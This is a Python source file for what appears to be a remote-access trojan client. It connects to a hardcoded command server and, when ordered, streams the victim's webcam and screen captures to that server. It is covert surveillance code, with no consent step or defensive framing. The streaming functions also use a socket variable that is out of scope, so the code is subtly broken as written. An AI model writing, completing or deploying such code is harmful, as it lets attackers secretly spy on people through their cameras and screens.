import socket
import threading
import time
import cv2
import pyautogui
import numpy as np
import requests
import io
import base64
import os
import threading

# Define the server IP and port
SERVER_IP = "10.0.1.33"
SERVER_PORT = 9999

# Helper function to send data to the server
def send_data(client_socket, data):
    client_socket.send(data.encode())

# Capture webcam stream
def webcam_stream():
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break
        ret, jpeg = cv2.imencode('.jpg', frame)
        if ret:
            # Convert to base64
            jpeg_bytes = jpeg.tobytes()
            jpeg_base64 = base64.b64encode(jpeg_bytes).decode('utf-8')
            send_data(client_socket, f"!webcam {jpeg_base64}")
        time.sleep(0.1)  # Adjust frame rate
    cap.release()

# Capture screen stream
def screen_stream():
    while True:
        # Capture the screen using pyautogui
        screenshot = pyautogui.screenshot()
        screenshot = np.array(screenshot)
        screenshot = cv2.cvtColor(screenshot, cv2.COLOR_RGB2BGR)
        
        ret, jpeg = cv2.imencode('.jpg', screenshot)
        if ret:
            # Convert to base64
            jpeg_bytes = jpeg.tobytes()
            jpeg_base64 = base64.b64encode(jpeg_bytes).decode('utf-8')
            send_data(client_socket, f"!screen {jpeg_base64}")
        time.sleep(0.1)  # Adjust frame rate

# Listen for incoming commands from the server
def listen_for_commands(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break

        if command == "!webcam_stream":
            print("[*] Starting webcam stream...")
            threading.Thread(target=webcam_stream).start()
        
        elif command == "!screen_stream":
            print("[*] Starting screen stream...")
            threading.Thread(target=screen_stream).start()

        # Handle other commands if needed
        else:
            print(f"[*] Unknown command: {command}")

# Connect to the server and handle communication
def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"[+] Connected to server {SERVER_IP}:{SERVER_PORT}")
        
        # Start listening for commands
        threading.Thread(target=listen_for_commands, args=(client_socket,)).start()

        # Send the initial command to tell the server we are connected
        send_data(client_socket, "!list")

        # Keep the client running
        while True:
            time.sleep(1)

    except Exception as e:
        print(f"Error connecting to server: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    start_client()
